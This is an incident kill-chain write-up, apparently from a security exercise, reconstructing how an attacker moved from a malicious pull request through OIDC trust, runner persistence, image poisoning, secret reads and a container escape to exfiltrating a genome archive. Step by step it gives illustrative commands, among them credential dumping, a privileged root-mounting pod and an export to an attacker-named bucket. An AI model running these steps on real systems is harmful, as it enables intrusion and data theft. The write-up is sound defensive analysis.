# Helix kill-chain — what the attacker did, step by step

*Each step has a short title, the tool or command an attacker would plausibly
use (blank where the step is passive), and the details with the findings that
back it up. Timings are from the case file; commands are representative — the
prototype's `attacker.py` runs the same logic against the mock server.*

---

## Step 1 — Open-source recon: attacker learns the exact role names

- **Title:** Public blog + repo survey reveals federation design
- **Command or tool:** `curl` + browser (passive)
- **Details:** Helix's own engineering blog names `HelixDeploy` and `HelixPipelineOps`, describes the OIDC federation model, and prints a workflow excerpt (**F1**). The attacker also confirms `helix-seqtools` is public and merges outside contributions regularly — 41 external PRs in 2026 (**F2**) — so one more PR won't look odd. No authentication needed; everything is public. This step costs nothing and risks nothing, and it hands the attacker the rest of the plan.

## Step 2 — Throwaway PR triggers trusted CI before any review

- **Title:** Malicious pull request executes under `pull_request_target`
- **Command or tool:** `gh pr create` (or GitHub web UI) from a fresh account; payload is a one-liner calling back to attacker infra
- **Details:** An account created 11 Nov with no other history opens a PR on 14 Nov (**F4**). Because the workflow listens on `pull_request_target`, the PR's head code runs immediately with base-repo secrets — *before* the one-required-review rule (**F27**) can do anything, since that rule only gates merging, not running (**F3**). The minted OIDC subject is the legitimate-looking `repo:helix-diagnostics/helix-seqtools:pull_request`. Prototype: `POST /api/github/pr` returns the run + OIDC claims.

## Step 3 — Attacker trades a low-trust token for the production deploy role

- **Title:** Org-wildcard OIDC trust grants `HelixDeploy`
- **Command or tool:** `aws sts assume-role-with-web-identity` (or cloud equivalent) from inside the CI job
- **Details:** `HelixDeploy`'s trust policy accepts any subject matching `repo:helix-diagnostics/*` (**F5**) — every repo, branch, and workflow in the org. The attacker's token from a side utility repo satisfies it exactly as well as the real pipeline's token would. There is no exploit here in the code sense; the policy *says* yes. This is the initial-access root cause. Prototype: `POST /api/iam/assume-deploy` with the attacker's `oidc_sub`.

## Step 4 — Code lands inside the build account on a shared, sticky runner

- **Title:** Execution on long-lived self-hosted runner
- **Command or tool:** bash inside the CI job; e.g. `env | grep -i aws ; echo implant > /opt/runner-env/.x`
- **Details:** The workflow needs registry access, so it runs on self-hosted VMs in `helix-build` (**F7**) rather than hosted runners — attacker code is now inside Helix's account boundary. Only the job working directory is wiped between runs; the runner process, environment, and anything outside `/work` persist across jobs (**F8**), so anything planted now can ride along on later *legitimate* builds. And with no node/runtime telemetry ever deployed (**F15**), nobody can reconstruct what ran. Prototype: `POST /api/runner/exec` with a `persist_path` outside `/work`.

## Step 5 — First role hop + silent swap of the shared base image

- **Title:** `HelixDeploy` → `HelixPipelineOps` → poison `stable` tag
- **Command or tool:** `aws sts assume-role` then `docker build && docker push registry.helix.internal/seq-pipeline/base:stable`
- **Details:** The attacker chains to `HelixPipelineOps` (**F10**; hop 1 of the never-traced chain **F25/F26**) and at 03:51 on 14 Nov pushes a new image to the `stable` tag — six weeks after the previous push, same night as the PR (**F9**). Tags are mutable and every pipeline job references the image *by tag, not digest*, so from this moment every run pulls the attacker's image with no config diff and no review trail. One-off CI access becomes standing production execution. Prototype: `POST /api/iam/assume-chain` then `POST /api/registry/push`.

## Step 6 — Poisoned jobs vacuum up every secret in the cluster

- **Title:** Stale cluster-wide binding exposes all secrets to every pod
- **Command or tool:** `kubectl get secrets -A` (from inside the poisoned pod; or direct API calls)
- **Details:** Every pod automounts a service-account token, joining `system:authenticated` (**F13**). The leftover `pipeline-reader` role (get/list secrets, configmaps, pods, cluster-wide — built for an abandoned 2023 observability trial) is still bound to that whole group (**F12**). Net effect: any pod, including the attacker's, can read any secret anywhere. 14,000 get/list calls follow over 15–22 Nov from a pipeline identity (**F11**). Prototype: `POST /api/k8s/list-secrets`.

## Step 7 — Container-to-node breakout; first alert fires and dies

- **Title:** Privileged + hostPath-root pod escapes to the node
- **Command or tool:** `kubectl apply -f evil-pod.yaml` (pod spec with `privileged: true` + `hostPath: {path: /}`)
- **Details:** On 16 Nov 04:12 a pipeline identity creates a pod mounting the node's root filesystem with a privileged security context (**F14**). No admission controller has ever existed in the cluster, so nothing evaluates or blocks it — full node compromise. The SOC's privileged-pod alert fires at 04:22 (**F20**) and is closed as "expected," because 90–140 *legitimate* privileged pods run daily for device access (**F21**) — the analyst pattern-matches the common flag and misses the rare one (hostPath `/`). No runtime telemetry (**F15**) means there's nothing deeper to pull. Prototype: `POST /api/k8s/create-pod` then `POST /api/soc/triage`.

## Step 8 — Second role hop breaks a year-long rhythm nobody monitors

- **Title:** `HelixPipelineOps` → `HelixDataExport` outside any pipeline run
- **Command or tool:** `aws sts assume-role` (from the K8s-held or runner-held `HelixPipelineOps` credentials)
- **Details:** Between 17 Nov and 9 Jan the attacker assumes `HelixDataExport` 41 times (**F16**). The prior eleven months saw ~1,100 assumes, *each* tied to a completed pipeline run — a clean 1:1 invariant. These 41 match zero runs. It's a loud anomaly hiding in a metric nobody charts, because no runbook covers role-chain behaviour (**F23**). Prototype: second `POST /api/iam/assume-chain` to `HelixDataExport`.

## Step 9 — Bulk read of the genome archive; second alert fires and dies

- **Title:** 31,000 reads against a ~2,400/month baseline
- **Command or tool:** `aws s3api get-object` in a loop / export-function invocations (legitimate read path, abusive volume)
- **Details:** 31,000 reads on `helix-sequences` from 19 Nov to 6 Jan (**F18**) — an order of magnitude over baseline — while the lab system records just 4,900 genuine report deliveries (**F19**), so ~26,000 reads map to no business event at all. The volume alert fires 19 Nov 09:03 (**F22**) and is closed as "month-end batch" — a guess the analyst cannot verify, because the SOC has no access to the LIS data that would disprove it. The count (31k) later matches the public dump almost exactly, forensically tying the role abuse to the leak. Prototype: chunked `POST /api/export/read` to 31,000.

## Step 10 — Records walk out through an unscoped delivery parameter

- **Title:** Export function writes 31k records to an attacker-chosen destination
- **Command or tool:** export-function invoke with `destination=s3://attacker-drop/...` (plain parameter, no injection needed)
- **Details:** `HelixDataExport` legitimately reads the archive and writes to "the destination in the config" — but nothing restricts that value to hospital-group buckets (**F17**). The attacker names their own bucket and the function complies; reads finish 6 Jan (**F31**), which is when the data leaves Helix storage. No policy was changed, no log disabled, no bucket made public (**F24**) — the export path *is* the feature, just pointed elsewhere. Prototype: `POST /api/export/deliver`.

## Step 11 — Staging, public dump, and accidental discovery

- **Title:** Dataset surfaces on a public research repository
- **Command or tool:** *(none on Helix infra — attacker-side handling)*; upload via a commercial hosting provider
- **Details:** A fresh public-repository account (4 Jan) uploads the cohort on 11 Jan — five days after Helix's reads end, implying staging or transit in between — from hosting-provider address space consistent with anonymisation (**F30**). Internal Helix sample IDs survive in the files, and a third-party researcher recognises the format from past collaboration, reporting it on 18 Jan. Discovery is external and chance-based; no Helix control finds the leak. The December credential-spray noise (**F29**) is unrelated background activity against nonexistent long-lived credentials.

---

### Steps deliberately *not* in this chain

- **F29 (Dec brute-force spray)** — failed, org-wide internet noise, no viable credential target (F24). Not attacker activity for this breach.
- **F24 (absent classic IoCs)** — confirms what *didn't* happen; supports the "legitimate identities, granted permissions" conclusion rather than adding a step.
- **F6 (log-retention gap), F28 (pentest scope), F32 (K8s audit hidden)** — real gaps that shaped *detectability* and *provability*, not actions the attacker took.
